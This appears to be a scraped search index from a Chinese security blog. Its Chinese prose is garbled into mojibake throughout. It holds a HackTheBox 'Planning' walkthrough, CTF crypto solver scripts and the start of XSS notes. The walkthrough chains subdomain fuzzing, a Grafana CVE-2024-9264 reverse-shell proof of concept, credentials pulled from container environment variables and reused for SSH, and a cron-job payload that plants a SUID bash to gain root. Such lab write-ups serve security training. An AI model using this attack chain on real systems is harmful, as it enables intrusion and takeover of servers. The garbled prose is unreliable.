London Bridge","uri":"/thm-the-london-bridge/"},{"categories":["é¶åœº"],"content":"å‰è¨€ å¥½ä¹…æ²¡æ‰“é¶æœºäº†ï¼Œæ˜¨å¤©ç¿æŠ—æ ¡èµ›æ‘¸é±¼æ‰“äº†ä¸€åŠï¼Œå›å®¿èˆæ‰“å®Œäº† ","date":"2025-05-25","objectID":"/htb-planning/:1:0","tags":["æ¸—é€"],"title":"HTB Planning","uri":"/htb-planning/"},{"categories":["é¶åœº"],"content":"å¤–ç½‘æ‰“ç‚¹ â¯ nmap -sC -sV 10.10.11.68 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 14:57 CST Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining) Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining) Nmap scan report for 10.10.11.68 Host is up (0.26s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA) |_ 256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-title: Did not follow redirect to http://planning.htb/ |_http-server-header: nginx/1.24.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.18 seconds æŠŠåŸŸååŠ åˆ°/etc/hostsé‡Œé¢ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰æ˜æ˜¾çš„ç›®æ ‡ï¼Œæ‰«ç›®å½• â¯ python dirsearch.py -u http://planning.htb Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12290 Target: http://planning.htb/ [15:03:45] Scanning: [15:04:03] 200 - 12KB - /about.php [15:04:30] 200 - 10KB - /contact.php [15:04:31] 301 - 178B - /css -\u003e http://planning.htb/css/ [15:04:43] 301 - 178B - /img -\u003e http://planning.htb/img/ [15:04:44] 200 - 23KB - /index.php [15:04:48] 403 - 564B - /js/ [15:04:48] 301 - 178B - /js -\u003e http://planning.htb/js/ [15:04:49] 301 - 178B - /lib -\u003e http://planning.htb/lib/ [15:04:49] 403 - 564B - /lib/ Task Completed ä¾æ—§æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œåé¢ä¸Šäº†ä¸ªå­—å…¸ä¹Ÿæ²¡æ‰«å‡ºæ¥ä¸œè¥¿ï¼Œçˆ†ä¸€ä¸‹å­åŸŸåè¯•è¯• â¯ ./ffuf -w /home/zsm/fuzzDicts-Pro/subdomainDicts/main.txt -u 'http://10.10.11.68' -H \"Host:FUZZ.planning.htb\" -fs 178 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : GET :: URL : http://10.10.11.68 :: Wordlist : FUZZ: /home/zsm/fuzzDicts-Pro/subdomainDicts/main.txt :: Header : Host: FUZZ.planning.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 178 ________________________________________________ grafana [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 268ms] æ‰«å‡ºæ¥ä¸€ä¸ªï¼ŒåŠ åˆ°æœ¬åœ°ï¼Œè®¿é—®ï¼Œæ˜¯ä¸ªgrafanaçš„loginé¡µé¢ï¼Œhtbç»™äº†è´¦å·å¯†ç admin / 0D5oT70Fq13EvB5rï¼Œè¿›å»ï¼ŒåŒæ—¶çœ‹è§ç‰ˆæœ¬æ˜¯v11ï¼Œç½‘ä¸Šæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰cveï¼ŒCVE-2024-9264ï¼Œdumpä¸‹æ¥ç›´æ¥æ‰“ sudo python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip ä½ çš„ip --reverse-port ä½ çš„port [SUCCESS] Login successful! Reverse shell payload sent successfully! Set up a netcat listener on port è¿™é‡Œæœ¬åœ°æ˜¯macï¼Œä¸€å®šè¦åŠ ä¸Šsudoæ‰å¯ä»¥è·‘ï¼ŒæˆåŠŸæ‹¿åˆ°shell Connection from 10.10.11.68:33462 sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) # ls LICENSE bin conf public # env GF_PATHS_HOME=/usr/share/grafana HOSTNAME=7ce659d667d7 AWS_AUTH_EXTERNAL_ID= SHLVL=1 HOME=/usr/share/grafana AWS_AUTH_AssumeRoleEnabled=true GF_PATHS_LOGS=/var/log/grafana _=ls GF_PATHS_PROVISIONING=/etc/grafana/provisioning GF_PATHS_PLUGINS=/var/lib/grafana/plugins PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin AWS_AUTH_AllowedAuthProviders=default,keys,credentials GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT! AWS_AUTH_SESSION_DURATION=15m GF_SECURITY_ADMIN_USER=enzo GF_PATHS_DATA=/var/lib/grafana GF_PATHS_CONFIG=/etc/grafana/grafana.ini AWS_CW_LIST_METRICS_PAGE_LIMIT=500 PWD=/usr/share/grafana dockeré€ƒé€¸ï¼Ÿå“¦ï¼Œæœ‰sshï¼Œå¯†ç è´¦å·(enzo/RioTecRANDEntANT!)ç›´æ¥ç™»å½•ï¼Œæ‹¿åˆ°flag enzo@planning:~$ ls user.txt ","date":"2025-05-25","objectID":"/htb-planning/:2:0","tags":["æ¸—é€"],"title":"HTB Planning","uri":"/htb-planning/"},{"categories":["é¶åœº"],"content":"ææƒ å…ˆä¼ linpeasä¸Šå»ï¼Œæ²¡ä»€ä¹ˆæ˜æ˜¾çš„æ¼æ´ï¼Œç¿»ä¸€ä¸‹ç»å¸¸æœ‰é—®é¢˜çš„ç›®å½•ï¼ŒæˆåŠŸæ‰¾åˆ° enzo@planning:/opt/crontabs$ cat crontab.db {\"name\":\"Grafana backup\",\"command\":\"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar \u0026\u0026 /usr/bin/gzip /var/backups/grafana.tar \u0026\u0026 zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \u0026\u0026 rm /var/backups/grafana.tar.gz\",\"schedule\":\"@daily\",\"stopped\":false,\"timestamp\":\"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)\",\"logging\":\"false\",\"mailing\":{},\"created\":1740774983276,\"saved\":false,\"_id\":\"GTI22PpoJNtRKg0W\"} {\"name\":\"Cleanup\",\"command\":\"/root/scripts/cleanup.sh\",\"schedule\":\"* * * * *\",\"stopped\":false,\"timestamp\":\"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)\",\"logging\":\"false\",\"mailing\":{},\"created\":1740849309992,\"saved\":false,\"_id\":\"gNIRXh1WIc9K7BYX\"} æœ‰ä¸ªå¯†ç ï¼Œå°è¯•æ‹¿è¿™ä¸ªç™»å½•rootï¼Œå‘ç°ä¸è¡Œï¼Œç»§ç»­ä¿¡æ¯æ”¶é›† enzo@planning:/opt/crontabs$ netstat -tunlp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33153 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.54:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.54:53 0.0.0.0:* - udp 0 0 127.0.0.53:53 0.0.0.0:* - 8000è½¬å‘åˆ°æœ¬åœ° ssh -L 8000:127.0.0.1:8000 enzo@planning.htb ä¸Šå»çœ‹çœ‹ï¼Œæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæ‹¿root/P4ssw0rdS0pRi0T3cè¿›å…¥ï¼Œæ˜¯ä¸ªwebæ§åˆ¶å™¨ï¼Œå¯ä»¥å¢åŠ å®šæ—¶ä»»åŠ¡ï¼Œå†™ä¸ªç»å…¸payloadè¿›å» cp /bin/bash /tmp/bash \u0026\u0026 chmod u+s /tmp/bash åœ¨webé¡µé¢å¯åŠ¨ä¸€ä¸‹è¿™ä¸€æ¡ï¼Œç„¶å enzo@planning:/tmp$ ll total 1464 drwxrwxrwt 12 root root 4096 May 24 07:54 ./ drwxr-xr-x 22 root root 4096 Apr 3 14:40 ../ -rwsr-xr-x 1 root root 1446024 May 24 07:54 bash* -rw-r--r-- 1 root root 0 May 24 07:54 Eceg9Qo0F31AOXNc.stderr -rw-r--r-- 1 root root 0 May 24 07:54 Eceg9Qo0F31AOXNc.stdout drwxrwxrwt 2 root root 4096 May 24 07:50 .font-unix/ drwxrwxrwt 2 root root 4096 May 24 07:50 .ICE-unix/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-ModemManager.service-ukafnm/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-polkit.service-dvnH4d/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-logind.service-7AOUm6/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-resolved.service-sb4bu2/ drwx------ 3 root root 4096 May 24 07:50 systemd-private-b8ab8f280a3c4e55a17b6bab09d1b891-systemd-timesyncd.service-c2KwUc/ drwx------ 2 root root 4096 May 24 07:51 vmware-root_736-2991268455/ drwxrwxrwt 2 root root 4096 May 24 07:50 .X11-unix/ drwxrwxrwt 2 root root 4096 May 24 07:50 .XIM-unix/ -rw-r--r-- 1 root root 0 May 24 07:54 YvZsUUfEXayH6lLj.stderr -rw-r--r-- 1 root root 0 May 24 07:54 YvZsUUfEXayH6lLj.stdout enzo@planning:/tmp$ ./bash -p bash-5.2# id uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo) bash-5.2# cd /root bash-5.2# ls root.txt scripts game over~ ","date":"2025-05-25","objectID":"/htb-planning/:3:0","tags":["æ¸—é€"],"title":"HTB Planning","uri":"/htb-planning/"},{"categories":["é¶åœº"],"content":"æ€»ç»“ è¢«ä¸€äº›å°ç‚¹å¡çš„è«åå…¶å¦™çš„ï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚ è¿™ä¸ªé¶æœºå°±æ˜¯å…¸å‹çš„ä¿¡æ¯æ”¶é›†çš„ï¼Œåªè¦æ”¶é›†å®Œäº†å°±ç™¾åˆ†ç™¾èƒ½å‡ºï¼Œæ²¡æœ‰è¿‡å¤šçš„æŠ€å·§å’Œä»£ç å®¡è®¡ ","date":"2025-05-25","objectID":"/htb-planning/:4:0","tags":["æ¸—é€"],"title":"HTB Planning","uri":"/htb-planning/"},{"categories":["CTF"],"content":"å‰è¨€ å’Œç¿æŠ—æ ¡èµ›æ’äº†ï¼Œèµ›åçœ‹çœ‹é¢˜å¤ç°ä¸€ä¸‹ï¼Œæ„Ÿè§‰è´¨é‡å¾ˆä¸€èˆ¬ ","date":"2025-05-25","objectID":"/huangheliuyu/:1:0","tags":["crypto"],"title":"é»„æ²³æµåŸŸCTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-05-25","objectID":"/huangheliuyu/:2:0","tags":["crypto"],"title":"é»„æ²³æµåŸŸCTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"Latice task.py from Crypto.Util.number import * from Crypto.Cipher import AES import os from secret import flag import numpy as np def gen(q, n, N, sigma): t = np.random.randint(0, high=q // 2, size=n) s = np.concatenate([np.ones(1, dtype=np.int32), t]) A = np.random.randint(0, high=q // 2, size=(N, n)) e = np.round(np.random.randn(N) * sigma**2).astype(np.int32) % q b = ((np.dot(A, t) + e).reshape(-1, 1)) % q P = np.hstack([b, -A]) return P, s def enc(P, M, q): N = P.shape[0] n = len(M) r = np.random.randint(0, 2, (n, N)) Z = np.zeros((n, P.shape[1]), dtype=np.int32) Z[:, 0] = 1 C = np.zeros((n, P.shape[1]), dtype=np.int32) for i in range(n): C[i] = (np.dot(P.T, r[i]) + (np.floor(q / 2) * Z[i] * M[i])) % q return C q = 127 n = 3 N = int(1.1 * n * np.log(q)) sigma = 1.0 P, s = gen(q, n, N, sigma) def prep(s): return np.array([int(b) for char in s for b in f\"{ord(char):08b}\"], dtype=np.int32) C = enc(P, prep(hint), q) P = P.tolist() C = C.tolist() print(f\"{P=}\") print(f\"{C=}\") ç¬¬ä¸€çœ¼çœ‹ä¸Šå»æ˜¯æ ¼+aesï¼Œä½†æ˜¯æ³¨æ„ä»£ç  encrypted = AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(b\"\".join([pad(i.encode(), 16) for i in flag])) flagå¤´å·²çŸ¥çš„æƒ…å†µä¸‹ï¼Œæ ¹æ®CBCçš„æ€§è´¨ï¼Œæœ‰m[:16]å’Œc[:16]ï¼Œå¼‚æˆ–å°±å¯ä»¥å¾—åˆ°iväº† exp.py import numpy as np from Crypto.Cipher import AES leak = -3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241 key = encrypted = iv = encrypted[:16] cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = cipher.decrypt(encrypted[16:]) print(decrypted.decode().strip()) ","date":"2025-05-25","objectID":"/huangheliuyu/:2:1","tags":["crypto"],"title":"é»„æ²³æµåŸŸCTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"sandwitch task.py from Crypto.Util.number import * import gmpy2 flag = b'flag{fake_flag}' assert len(flag) == 39 p = getPrime(512) q = getPrime(512) n = p * q e = 0x3 pad1 = b'easy_problem' pad2 = b'How_to_solve_it' c = pow(bytes_to_long(pad1 + flag + pad2),e,n) print(f'n = {n}') print(f'c = {c}') å¾ˆç»å…¸çš„copperï¼Œé«˜ä½ä½å·²çŸ¥çˆ†ç ´ä¸­é—´ï¼Œä¸”å·²çŸ¥len(flag)=39å’Œlen(pad2)=15ï¼Œé‚£ä¹ˆå°±å¯ä»¥å†™å‡ºå¦‚ä¸‹çš„å¼å­ $$ c = (256^{54}pad_1+256^{15}flag+pad2)^{e} \\mod n $$exp.py from Crypto.Util.number import * import hashlib from tqdm import * def hash(x): return hashlib.sha256(x.encode()).digest() e = 3 n = c = pad1 = b'easy_problem' pad2 = b'How_to_solve_it' pad1 = bytes_to_long(pad1) pad2 = bytes_to_long(pad2) PR.\u003cx\u003e = PolynomialRing(Zmod(n)) f = (pad1 * 256 ** 54 + x * 256 ** 15 + pad2 )^e - c f = f.monic() res = f.small_roots(X=256^39,beta=1,epsilon=0.04) if(res != []): print(long_to_bytes(int(res[0]))) ","date":"2025-05-25","objectID":"/huangheliuyu/:2:2","tags":["crypto"],"title":"é»„æ²³æµåŸŸCTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"Happy task.py import os, utils from secret import flag assert flag.startswith(b'flag{') and flag.endswith(b'}') seed = int(os.urandom(16).hex(), 16) gen = utils.Gen(seed) msg = b'Happy4321: ' + flag enc = bytes(m ^ next(gen) for m in msg).hex() print(enc) utils.py class Gen: def __init__(self, state): self.nbits = 128 self.state = state \u0026 ((1 \u003c\u003c self.nbits) - 1) self.mask = 109908700282042807039366676242995409413 def func0(self, steps=1): for _ in range(steps): res = self.state \u0026 self.mask bit = sum([(res \u003e\u003e i) \u0026 1 for i in range(self.nbits)]) \u0026 1 self.state = ((self.state \u003c\u003c 1) ^ bit) \u0026 ((1 \u003c\u003c self.nbits) - 1) return bit def __next__(self): out = 0 for _ in range(8): bit = self.func0(2023) out = (out \u003c\u003c 1) ^ bit return out å’ŒNKCTF2023çš„é¢˜å·®ä¸å¤šï¼Œè€Œä¸”éš¾åº¦å‡å°äº†ä¸€ç‚¹ç‚¹ï¼Œå‚è€ƒXMCVE exp.py # SageMath class Gen: def __init__(self, state): self.nbits = 128 self.state = state \u0026 ((1 \u003c\u003c self.nbits) - 1) self.mask = 109908700282042807039366676242995409413 def func0(self, steps=1): for _ in range(steps): res = self.state \u0026 self.mask bit = sum([(res \u003e\u003e i) \u0026 1 for i in range(self.nbits)]) \u0026 1 self.state = ((self.state \u003c\u003c 1) ^ bit) \u0026 ((1 \u003c\u003c self.nbits) - 1) return bit def __next__(self): out = 0 for _ in range(8): bit = self.func0(2023) out = (out \u003c\u003c 1) ^ bit return out n = 128 msg = b'Happy4321: flag{' mask = 109908700282042807039366676242995409413 enc = '' enc = bytes.fromhex(enc) Round = 2023 # æ„å»ºMçŸ©é˜µ M = matrix(GF(2), n, n) for i in range(n): if i+1\u003cn: M[i+1, i] = 1 if mask\u0026(1\u003c\u003c(n-i-1)): M[i, -1] = 1 else: M[i, -1] = 0 # seed * M2 = output_s M2 = matrix(GF(2), n, n) for i in range(n): tmp = M^(Round*(i+1)) for y in range(n): M2[y, i] = tmp[y, -1] # æ„å»ºoutput_sçŸ©é˜µ output_s = [] for i in range(len(msg)): tmp = msg[i]^^enc[i] for x in range(8): if tmp\u0026(1\u003c\u003c(8-x-1)): output_s.append(1) else: output_s.append(0) output_s = vector(GF(2), output_s) S = M2.solve_left(output_s) seed = int(''.join([str(each) for each in S]), 2) print(seed) import os enc = '' enc = bytes.fromhex(enc) seed = 16527323701539137374460041583215952894 gen = Gen(seed) flag = bytes(c ^ next(gen) for c in enc) print(flag) ","date":"2025-05-25","objectID":"/huangheliuyu/:2:3","tags":["crypto"],"title":"é»„æ²³æµåŸŸCTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"å› å¼åˆ†è§£ task.py from Crypto.Util.number import * from gmpy2 import* from secret import flag,a,b,c m = bytes_to_long(flag) p = getPrime(256) q = getPrime(256) n = p * q e = 65537 _q = int(bin(q)[2:][::-1] , 2) c = pow(m,e,n) print('n =',n) print('c =',c) assert a**3+b**3+c**3 == 3*a*b*c gift = secert**3 - 9*secert + 8 print(gift) assert 3*(p ^ _q) == a + b + c tellasecret.py import string from secret import hint from secret import encrypt import random dicts = string.ascii_lowercase +\"{=}\" key = (''.join([random.choice(dicts) for i in range(4)])) * 8 assert(len(hint) == 32) assert(len(key) == 32) cipher = encrypt(hint, key) print(cipher) è¿™ä¸ªä¸œè¥¿æˆ‘æ˜¯çœŸçš„çœ‹ä¸æ‡‚ï¼Œæ²¡getåˆ°ä»–åˆ°åº•æƒ³è®©æˆ‘å¹²ä»€ä¹ˆï¼Œå¯¹äº_qè‚¯å®šæ˜¯ä¸ªå‰ªæäº†ï¼Œå¯ä»¥å‚è€ƒé¸¡å—ç¥çš„æ–‡ç« ï¼Œä½†æ˜¯è¿™ä¸ªserectæˆ‘æ˜¯çœŸçš„æ²¡çœ‹æ‡‚ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„åšå®¢æˆ‘æ‰çŸ¥é“æ˜¯ç»´å‰å°¼äºšçˆ†ç ´ï¼ŒçœŸéš¾ç»· exp1.py from itertools import product dicts = \"abcdefghijklmnopqrstuvwxyz{=}\" cipher = \"cp=wmaunapgimjfpopeblvup=aywqygb\" # æš´åŠ›ç ´è§£ 4 å­—èŠ‚ key for key in product(dicts, repeat=4): key = ''.join(key) * 8 plain = '' for i in range(len(cipher)): c = dicts.index(cipher[i]) k = dicts.index(key[i]) p = (c - k) % 29 plain += dicts[p] if \"secret\" in plain: print(\"Key:\", key[:4]) print(\"Plaintext:\", plain) break # tellasecret{a=secert}keepsilentt è¿™æ˜¯ç¬¬ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆå°±è§£å‡ºæ¥a=secertï¼Œçœ‹abcçš„å…³ç³»å¼ï¼Œå¾ˆç»å…¸çš„è½®æ¢å¼ï¼Œç›´æ¥æƒ³åˆ°a=b=cï¼Œé‚£ä¹ˆå¯çŸ¥p^_q=aï¼Œè§£æ–¹ç¨‹æ±‚aç„¶åå‰ªæå°±è¡Œäº† exp2.py gift = k = var('secret') p = k polys = (p**3 - 9*p + 8 == gift) x = solve(polys, k) print(x) from Crypto.Util.number import * import sys sys.setrecursionlimit(1500) pxorq = n = c = e = 65537 pxorq = str(bin(pxorq)[2:]).zfill(256) def find(ph, qh, pl, ql): l = len(ph) tmp0 = ph + (256 - 2 * l) * \"0\" + pl tmp1 = ph + (256 - 2 * l) * \"1\" + pl tmq0 = qh + (256 - 2 * l) * \"0\" + ql tmq1 = qh + (256 - 2 * l) * \"1\" + ql if (int(tmp0, 2) * int(tmq0, 2) \u003e n): return if (int(tmp1, 2) * int(tmq1, 2) \u003c n): return if (int(pl, 2) * int(ql, 2) % (2 ** (l - 1)) != n % (2 ** (l - 1))): return if (l == 128): pp0 = int(tmp0, 2) if (n % pp0 == 0): pf = pp0 qf = n // pp0 phi = (pf - 1) * (qf - 1) d = inverse(e, phi) m1 = pow(c, d, n) print(long_to_bytes(m1)) exit() else: if (pxorq[l] == \"1\" and pxorq[255 - l] == \"1\"): find(ph + \"1\", qh + \"0\", \"1\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"0\", \"1\" + pl, \"1\" + ql) find(ph + \"1\", qh + \"1\", \"0\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"1\", \"0\" + pl, \"1\" + ql) elif (pxorq[l] == \"1\" and pxorq[255 - l] == \"0\"): find(ph + \"1\", qh + \"0\", \"0\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"0\", \"0\" + pl, \"1\" + ql) find(ph + \"1\", qh + \"1\", \"1\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"1\", \"1\" + pl, \"1\" + ql) elif (pxorq[l] == \"0\" and pxorq[255 - l] == \"1\"): find(ph + \"0\", qh + \"0\", \"1\" + pl, \"0\" + ql) find(ph + \"0\", qh + \"1\", \"0\" + pl, \"0\" + ql) find(ph + \"1\", qh + \"0\", \"1\" + pl, \"1\" + ql) find(ph + \"1\", qh + \"1\", \"0\" + pl, \"1\" + ql) elif (pxorq[l] == \"0\" and pxorq[255 - l] == \"0\"): find(ph + \"0\", qh + \"0\", \"0\" + pl, \"0\" + ql) find(ph + \"1\", qh + \"0\", \"0\" + pl, \"1\" + ql) find(ph + \"0\", qh + \"1\", \"1\" + pl, \"0\" + ql) find(ph + \"1\", qh + \"1\", \"1\" + pl, \"1\" + ql) find(\"1\", \"1\", \"1\", \"1\") ","date":"2025-05-25","objectID":"/huangheliuyu/:2:4","tags":["crypto"],"title":"é»„æ²³æµåŸŸCTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"æ€»ç»“ é¢˜ç›®è´¨é‡è¿˜è¡Œå§ï¼Ÿå› å¼åˆ†è§£è¿™ç©æ„å‰é¢æ˜¯ç»´å‰å°¼äºšçœŸæ²¡æƒ³åˆ°xd ","date":"2025-05-25","objectID":"/huangheliuyu/:3:0","tags":["crypto"],"title":"é»„æ²³æµåŸŸCTF-crypto","uri":"/huangheliuyu/"},{"categories":["CTF"],"content":"XSSåŸç† XSSçš„åŸç†æ˜¯æ¶æ„æ”»å‡»è€…å¾€ Web é¡µé¢é‡Œæ’å…¥æ¶æ„å¯æ‰§è¡Œç½‘é¡µè„šæœ¬ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„è„šæœ¬ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œå¯ä»¥è¾¾åˆ°æ”»å‡»è€…ç›—å–ç”¨æˆ·ä¿¡æ¯æˆ–å…¶ä»–ä¾µçŠ¯ç”¨æˆ·å®‰å…¨éšç§çš„ç›®çš„ã€‚ ","date":"2025-05-09","objectID":"/study_xss/:1:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"XSSæ”»å‡»ç±»å‹ æ ¹æ®XSSè„šæœ¬æ³¨å…¥æ–¹å¼çš„ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥å°†XSSæ”»å‡»ç®€å•çš„åˆ†ç±»ä¸ºåå°„å‹XSSã€å­˜å‚¨å‹XSSã€DOM-based å‹ã€‚ ","date":"2025-05-09","objectID":"/study_xss/:2:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"åå°„å‹XSS åˆç§°ä¸ºéæŒä¹…å‹XSSã€‚ æµç¨‹ï¼šå‘å‡ºè¯·æ±‚(XSSä»£ç åµŒå¥—è¿›URL)â€“\u003eæœåŠ¡ç«¯è§£æå¹¶ä¸”å“åº”â€“\u003eä¼ å›ç»™æµè§ˆå™¨å¹¶ä¸”è§£æ ç‰¹ç‚¹ï¼š å³æ—¶æ€§ã€‚ä¸ç»è¿‡æœåŠ¡å™¨å­˜å‚¨ï¼Œç›´æ¥é€šè¿‡ HTTP çš„ GET å’Œ POST è¯·æ±‚å°±èƒ½å®Œæˆä¸€æ¬¡æ”»å‡»ï¼Œæ‹¿åˆ°ç”¨æˆ·éšç§æ•°æ® æ”»å‡»è€…éœ€è¦å—å®³è€…\"é…åˆ\" éš¾å‘ç°ï¼Œéš¾ä¿®å¤ï¼Œéš¾æ”¶å½•() ç›—å–ç”¨æˆ·æ•æ„Ÿä¿å¯†ä¿¡æ¯ ","date":"2025-05-09","objectID":"/study_xss/:2:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"å­˜å‚¨å‹XSS åˆç§°ä¸ºæŒä¹…å‹XSSï¼Œä»–å’Œåå°„å‹XSSæœ€å¤§çš„ä¸åŒå°±æ˜¯ï¼Œæ”»å‡»è„šæœ¬å°†è¢«æ°¸ä¹…åœ°å­˜æ”¾åœ¨ç›®æ ‡æœåŠ¡å™¨ç«¯ï¼Œä¸‹æ¬¡ä¸ç”¨å†å»æäº¤XSSä»£ç  ä¸€èˆ¬å­˜åœ¨äº Form è¡¨å•æäº¤ç­‰äº¤äº’åŠŸèƒ½ï¼Œå¦‚å‘å¸–ç•™è¨€ï¼Œæäº¤æ–‡æœ¬ä¿¡æ¯ç­‰ï¼Œé»‘å®¢åˆ©ç”¨çš„ XSS æ¼æ´ï¼Œå°†å†…å®¹ç»æ­£å¸¸åŠŸèƒ½æäº¤è¿›å…¥æ•°æ®åº“æŒä¹…ä¿å­˜ï¼Œå½“å‰ç«¯é¡µé¢è·å¾—åç«¯ä»æ•°æ®åº“ä¸­è¯»å‡ºçš„æ³¨å…¥ä»£ç æ—¶ï¼Œæ°å¥½å°†å…¶æ¸²æŸ“æ‰§è¡Œã€‚ è¿™ç§æ”»å‡»å¤šè§äºè®ºå›ï¼Œæ”»å‡»è€…åœ¨å‘å¸–çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥åˆ°å¸–å­çš„å†…å®¹ä¹‹ä¸­ã€‚éšç€å¸–å­è¢«è®ºå›æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿæ°¸ä¹…åœ°è¢«å­˜æ”¾åœ¨è®ºå›æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶å®ƒç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­çš„æ—¶å€™ï¼Œæ¶æ„è„šæœ¬åˆ™ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œï¼Œä»è€Œå—åˆ°äº†æ”»å‡»ã€‚ ç‰¹ç‚¹ï¼š æŒä¹…æ€§ï¼Œç›´æ¥æ‰“åˆ°æ•°æ®åº“é‡Œé¢ å±å®³å¤§ã€‚ç”šè‡³å¯ä»¥æŠŠç”¨æˆ·æœºå™¨å˜æˆè‚‰é¸¡å»é€ æˆå±å®³ ç›—å–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ ","date":"2025-05-09","objectID":"/study_xss/:2:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"DOM-based å‹ 